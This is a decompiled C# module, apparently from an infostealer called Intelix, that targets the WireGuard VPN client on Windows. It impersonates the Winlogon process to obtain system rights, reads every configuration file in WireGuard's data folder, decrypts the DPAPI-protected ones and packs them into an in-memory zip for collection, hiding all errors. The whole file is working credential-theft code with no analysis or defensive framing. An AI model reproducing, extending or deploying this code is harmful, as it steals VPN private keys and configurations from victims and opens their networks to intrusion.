using System;
using System.IO;
using System.Threading.Tasks;
using Intelix.Helper;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;

namespace Intelix.Targets.Vpn
{
	// Token: 0x02000016 RID: 22
	public class WireGuard : ITarget
	{
		// Token: 0x0600003F RID: 63 RVA: 0x00003710 File Offset: 0x00001910
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = "C:\\Program Files\\WireGuard\\Data\\Configurations";
			bool flag = !Directory.Exists(text);
			if (!flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "WireGuard";
				try
				{
					using (ImpersonationHelper.ImpersonateWinlogon())
					{
						Parallel.ForEach<string>(Directory.GetFiles(text), delegate(string file)
						{
							try
							{
								string extension = Path.GetExtension(file);
								bool flag2 = extension == ".dpapi";
								if (flag2)
								{
									byte[] content = DpApi.Decrypt(File.ReadAllBytes(file));
									zip.AddFile("WireGuard\\" + Path.GetFileNameWithoutExtension(file), content);
								}
								else
								{
									bool flag3 = extension == ".conf";
									if (flag3)
									{
										zip.AddFile("WireGuard\\" + Path.GetFileNameWithoutExtension(file) + ".conf", File.ReadAllBytes(file));
									}
								}
							}
							catch
							{
							}
						});
					}
				}
				catch
				{
				}
				counterApplications.Files.Add(text + " => WireGuard");
				counterApplications.Files.Add("WireGuard\\");
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
